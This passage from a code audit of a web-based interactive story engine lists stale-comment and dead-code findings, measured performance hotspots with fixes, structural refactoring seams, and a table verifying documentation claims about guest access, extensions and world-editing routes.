### F26 — Join-code comment: "32-symbol alphabet is 40 bits"

- **Severity:** STALE-DOC. **Confidence:** CONFIRMED (snippet: `len(CODE_ALPHABET) == 31`, 39.63 bits).
- **Where:** `web/guest_access.py:65-69`. The security argument still holds (30-minute single-use code, global 10/min limiter → ≤300 tries against 8.5e11); fix the numbers.

### F27 — `provision_story` says every value is validated before the archive is touched; `player_authority` is validated inside the transaction

- **Severity:** STALE-DOC (low). **Confidence:** CONFIRMED.
- **Where:** `extension_runtime/api.py:2244-2246` and `2278-2284` vs `2369-2382`. Rollback keeps it atomic; move the check up with the others.

### F28 — `story_view.latest_turn(frame_id=...)` branch is dead and duplicates `_turn_in_frame`

- **Severity:** DEAD. **Confidence:** CONFIRMED (grep: callers `web/story_view.py:188`, `extension_runtime/api.py:913`, neither passes a frame).
- **Where:** `web/story_view.py:113-128`; the non-None branch is the same SQL as `_turn_in_frame` (131-138). Drop the parameter.

### F29 — `apply_plan_splices(plan, chat_id=None)` never reads `chat_id`

- **Severity:** DEAD. **Confidence:** CONFIRMED.
- **Where:** `extension_runtime/__init__.py:883-938`; passed by `agents/runtime.py:400`. A per-chat splice is impossible although the signature suggests one; drop the parameter or document it as reserved.

---

## Efficiency

1. **Whole-scene layout lint on every World Browser request** — `web/world_routes.py:413-427` `_lint_rows` → `room_layout_lint(scene, plan_rows=True)`, recomputed by `rooms_index` (704), `rooms_slice` via `_decorated_slice` (826-827), `rooms_grid` (1317), `map_index` (1376) and every write's response (`_decorated_slice` after `_write_scene`). Per request. Measured on real scenes (engine.db read-only): chat 172 (22 rooms) 58 ms, chat 175 (20) 40 ms, chat 63 (24) 22 ms — against 0.4-0.8 ms to parse the scene and 13-15 ms for the room's own `grid_view`. One map edit = 1 write + the client's index/grid/map refetch = ~4 lint passes. **Fix:** memoize on `(cid, frame, db.world_read_token("scene"))`. **Gain:** ~40-60 ms × 4 per edit now, growing with room count.
2. **`story_view` re-parses the charter registry on every call** (F24) — `web/story_view.py:388-410`. Per call: 76 ms on the owner's largest current registry (chat 175, 0.9 MB), ~1-2 s on a generated town (core/db.py's own 41.4 MB measurement), plus `registry_warnings`. Hot wherever an extension renders: campaign-demo's `/campaign` route calls `api.story_view` only to read `player_authority.mode` (`extensions/campaign-demo/extension.py:220`), on the event loop (F20). **Fix:** `registry_for` (cached); a narrower read for one field. **Gain:** the whole parse, per call.
3. **The guest page re-downloads the whole transcript every 10 s** — `web/app.py:5265-5360` reads `active_mappings(cid, "narrator_extra")` for every turn and returns every turn's prose per poll (`static/guest.html:203, 215`). Per guest per 10 s, linear in story length: the longest local chat (64, 171 turns) carries ~199 KB of narrator text; `persist/steps.py:107-112` notes the owner's chats reach ~2,500 turns. `active_mappings(..., after_turn_id=)` already exists for the host's `?since_turn_id=`. **Gain:** O(new turns) per poll instead of O(story).
4. `DocumentStore.put_now` counts documents by reading every row's full value (`extension_runtime/api.py:653-654`, `len(self._rows())` — up to 256 × 128 KiB) per new document; `_delete_key` bumps the GLOBAL world epoch per document (`api.py:590-591`), so `delete_prefix_now` invalidates every cached world row of every chat N times (the charters cache included). Rare; use `COUNT(*)` and one bump per call.
5. `player_view` → `_viewer_memories` (`web/story_view.py:613-620`) reads all of a character's memories (`SELECT *` in `mind/memory_read.py:132`) and sorts in Python to return `limit` (default 12). Per call; linear in the character's memory count.
6. `install_extension` builds the download with `blob += chunk` (`extension_runtime/__init__.py:2367-2372`) — quadratic copying up to the 32 MB cap. Rare; use a `bytearray`.
7. Minor, per request: `map_view` calls `room_site(scene, rid)` twice per room (1272-1273); `_decorated_slice` reads `region_registry` twice (`_region_look`, `_region_far_look`, 765-780); `storey_plan` calls `room_of` per position (O(B²), 293-302).

---

## Already registered

- **Map editor refuses the Director's centre bearing (F44)** — `docs/UNBUILT_PLANNING.md` §2.35 (line ~846): "Two writers, two vocabularies for an anchor's `dir`".
- **The map editor's `pointed_at` check is narrower than `aim_of`** — `docs/UNBUILT_PERCEPTION.md` §2.34 (line ~2270).
- **Map editor gaps of 2026-09-04/05** — `docs/UNBUILT_PLANNING.md` §2.26 (line ~344).
- **Extension platform gaps** — `docs/UNBUILT_PLATFORM.md` §6.2: documents not frame-scoped; no read-snapshot token (relevant to F5's DTO consistency); archive does not declare its extension schema; `extension_runtime/` outside the UI catalog; `Sonder._unload` side effects; the two "absent means absent" edges of `player_view["people"]`.
- **The off-screen ladder collapse** — `docs/UNBUILT_LIVING_WORLD.md` §1.105. Registered as a ruling, NOT the provisioning break in F13; its text ("`provision_story(offscreen_life=...)` is a published extension contract -- so nothing that reads the ladder had to change") is itself stale since `7140b9cc`. Also §1.108 (line ~2031) still says "`LIVING_WORLD_APPROACHES` has four" (it has none).
- **Site derivation timing between `world_put` and `_write_scene`** — `docs/UNBUILT_WORLD.md` §2.39 (line ~3309).

---

## Structure notes

- **`web/world_routes.py` (2,893 lines)** has seven natural seams: (a) read projections — `group_rows`, `body_rows`, `charter_body_records`, `_decorated_slice`, `grid_view`, `_overlays`, `map_view`, `_draw_as_the_lab`, `map_plan` (~1,100 lines); (b) room/entity field writers (`_apply_exits`, `_apply_anchors`, `_apply_parts`, `_apply_extent`, `room_patch`, `room_entity_patch`); (c) create/remove; (d) `bodies_router`; (e) `doorways_router`; (f) `regions_router`; (g) `charters_router`. Monoliths in miniature: `grid_view` (885-1101, ~215 lines), `room_entity_patch` (1819-1914), `map_view` (1223-1302), `room_patch` (1749-1816).
- **Two copies of one contract:** the module docstring (1-246, an API spec in prose) and AGENTS.md's World Browser row (line 532) restate the same routes and have already diverged (F25).
- **One write path missing a shared seam:** every scene writer outside the commit (`world_routes._write_scene`, `app.world_put`, `app.chat_char_position_put`, `paradox`, `plot_packages` package ops) re-implements "write the blob + keep the projections"; only paradox keeps `world_entities`, only the browser keeps the registry, none take a lock (F4, F5, F10). A single `write_scene_outside_commit(cid, before, after)` owning normalisers, both projections and the lock would close the class.
- **Three cast readers, three name derivations:** `story_view._cast` (`chat_sheet or base_sheet`, `character_name_from_text`), `world_routes._cast_ids` (`COALESCE`, `character_name(json.loads)`), `api.CharacterAccess._rows` (`COALESCE`, `character_name_from_text` + `characters.name`).
- **Two name-matching rules for `positions`:** `world_routes._position_key`/`_body_kind` (casefold) vs the engine's `room_of`/`fold_identity_key` (F6).
- **`storey_plan.py:250`** restates `WINDOW_BARRIERS` as the literal `("window", "one_way_window")` — equal today, a drift hazard; use `is_window_barrier`.
- **Three near-copies of one hook loop** (`dispatch_character_payload` 1063-1127, `dispatch_director_payload` 1295-1363, `dispatch_narration_payload` 1366-1439) with three different behaviours on `None`, exceptions and failure counting (F9).
- **`extension_runtime/__init__.py` (2,654 lines)** seams: discovery/manifest (110-385), enable/activation (387-878), dispatch seams (880-1622), assets (1623-1806), install/update/remove (1837-2654, ~800 lines → `extension_runtime/install.py`). `api.py` seams: state/blocks/documents (68-885), frames (886-998), characters (999-1141), views/contexts (1143-1540), facade (1541-2786).
- **Module-level mutable state:** `extension_runtime/__init__.py:101-107` — `_extensions`, `_errors` (writers `installed_extensions`, `reload`), `_registered` (`_record_*`, `_activate_one`, `_deregister`, `activate`, `reload`), `_apis` (`_activate_one`), `_activated_for` (`activate`, `reload`), `_observer_failures` — incremented OUTSIDE `_lock` from pipeline threads (964, 996, 1034, 1112, 1280, 1424); a lost increment is benign. `web/guest_access.py:284-320` `_join_attempts`/`_login_attempts`, all writers under `_RATE_GUARD`. `web/story_view.py` and `web/world_routes.py` hold none.
- **Silent tolerance, low:** `grid_view`'s `sight_from` verdicts swallow every exception per body (`world_routes.py:1008-1012`), so the debug drawer shows nothing for exactly the body whose perception raised. `_load_manifest` accepts `"ext_api": true` (`True == 1`, `__init__.py:288`).
- **Auth notes (not defects):** the login limiter is deliberately global, so anyone who can reach `/api/auth/login` can hold sign-in shut at 10 failures/minute (existing sessions last 30 days); `verify_host_login` hashes on a wrong username too (constant-ish time); token/session lookups are by SHA-256 hash, so no comparison timing applies; there is no password-change route, and the reset hatch deletes every session. `tests/test_login_lockout_legibility.py` proves: only failures spend the window; a success clears it; the 429 carries `retry_after_seconds` and `Retry-After`; checking does not spend; no-account is a 409 that spends nothing; wrong-user and wrong-password 401s are byte-identical.

---

## Docs checked

| Claim | Where | Held? |
|---|---|---|
| World Browser writes are host-only, era-scoped, and refused with 409 while the chat's pipeline runs | `world_routes.py:101-110`, AGENTS.md:532 | **Held** — all 18 writers call `_require_idle`; reads are unguarded by design. |
| Every write applies "the SAME normalisers the commit path runs" | `world_routes.py:103-110`, `_write_scene` 1724-1726 | **Partly** — 7 of the merge tail's ~16 run; the place-detail/support invalidators, contacts, containment, poses, comms, scales and subjects do not (F10). |
| "Every scene writer must keep the registry projection in sync" | AGENTS.md:880 | **Held for `room_registry`**; `world_entities`, the other derived projection named in the same paragraph, is not kept (F4). |
| "only the registered cast moves between rooms" | AGENTS.md:532, `world_routes.py:2009-2012` | **Stale** (F25). |
| `player_view` is built only from what the engine already delivered | `story_view.py:13-26`, `919-957` | **Held** — perception steps, the frame's `known` ledger, `visible_memory_rows`, the frame overlay's relationships; `clock` is objective but characters receive it too (`agents/character.py:3939-3947`). |
| A viewer never inherits another's view | EXTENSIONS.md:803-804 | **Held** (`_delivered` keys by viewer id). |
| `story_view` HTTP routes are not called in-tree | `app.py:6276-6287` | **Held** (no `static/` caller). |
| The presence namespace is stripped from archives (WEB-19) | `story_view.py:729-737` | **Held** — `chat_archive.UNEXPORTED_WORLD_KEYS`; checkpoints preserve it (`checkpoints.py:971-982`). |
| `_living_world`: "registry_for would re-read and re-parse" | `story_view.py:400-403` | **Stale** — `registry_for` is cached (F24). |
| Guest: single-use 30-min code, 24 h token, revocation, persona/chat binding | `guest_access.py:17-23`, 382-477 | **Held** — atomic claim, `revoked=0` and `cp.status='active'` on every verify; guests reach only `/api/guest/state|input`, both bound to the grant. |
| SameSite=Strict "is what actually stops" forged requests | `guest_access.py:9-16` | **Partly** — true cross-site, false same-site cross-origin (F1). |
| "8 chars over this 32-symbol alphabet is 40 bits" | `guest_access.py:65-68` | **Stale** — 31 symbols, 39.6 bits (F26). |
| Setup can only be completed from the machine | `auth_routes.py:140-151` | **Partly** — a rebinding page in the host's browser is "from the machine" (F2); a mapped IPv4 peer on a dual-stack bind is refused (F19). |
| Extension deep imports are linted, not forbidden | `tools/project_check.py:1551-1562` | **Held, by design** — bundled `extensions/` only; runtime imports are unrestricted (EXTENSIONS.md §8). |
| `ext_api` must be exactly 1 | EXTENSIONS.md:69, `__init__.py:288-291` | **Held** (also accepts JSON `true`). |
| "A hook that throws leaves the payload exactly as assembled" / every changed key attributed | EXTENSIONS.md:630-631, §8; `__init__.py:1066-1073` | **False** for in-place-then-raise, and for a Director hook that returns None (F9). |
| `on_step` / `StepView` are read-only by construction | EXTENSIONS.md:417-420, 1688-1693; `api.py:1146-1154` | **False** — live objects (F3). |
| Raise ExtensionError from a route for a 404 | EXTENSIONS.md:482 | **Held** in the guide; `api.add_route`'s docstring says 400 (F22). |
| A disabled extension's handlers are gone immediately | EXTENSIONS.md:247-249 | **Held** — and that is what can kill an in-flight turn (F12). |
| Fixing the file and re-enabling runs the fixed file | EXTENSIONS.md:1211 | **Held via disable+enable**; a bare `/enable` does not retry (F17). |
| Anchor grammar "validated" (`stage_anchors` capability) | `api.py:1704-1706`, EXTENSIONS.md:1142-1161 | **Partly** — shape and reserved prefixes only (F15). |
| `provision_story(offscreen_life=, living_world=)` sets how much of the world runs | EXTENSIONS.md:1026-1076, `api.py:2225-2242`, `HOST_CAPABILITIES` | **False** — example refused, `offscreen_life` inert (F13). |
| "Five homes" (§5) vs "The four namespaced homes" (§8) | EXTENSIONS.md:1224, 1722 | **Inconsistent** — five (documents is the fifth, `api.py:468`). |
| `on_turn_committed` state would survive a rollback | EXTENSIONS.md:1424-1425 | **False** for a reroll (F23). |
| Every dispatch helper is total and returns the safe value | `__init__.py:18-21`, EXTENSIONS.md:39-40 | **Partly** — payload dispatchers can return a hook-mutated payload after the hook failed (F9). |
| Every value is validated before the archive is touched | `api.py:2244-2246` | **Partly** — `player_authority` is checked inside the transaction (F27). |
| `test_living_world_extension_hooks.py` covers hook 2 (provision sets the ladder) | that file's docstring 15-16 | **Stale** — no such test remains (F13). |
